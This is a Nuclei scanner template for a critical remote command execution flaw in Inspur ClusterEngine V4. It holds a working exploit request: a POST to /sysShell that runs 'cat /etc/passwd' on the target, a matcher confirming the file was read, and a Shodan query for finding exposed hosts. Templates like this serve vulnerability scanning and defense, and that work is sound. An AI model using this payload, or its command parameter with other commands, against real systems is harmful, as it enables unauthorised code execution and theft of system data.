id: inspur-clusterengine-v4-sysshell-rce

info:
  name: Inspur Clusterengine V4 SYSshell RCE
  author: ritikchaddha
  severity: critical
  reference:
    - https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce
  metadata:
    verified: true
    shodan-query: title="TSCEV4.0"
  tags: inspur,clusterengine,rce

requests:
  - raw:
      - |
        POST /sysShell HTTP/1.1
        Host: {{Hostname}}

        op=doPlease&node=cu01&command=cat+/etc/passwd

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
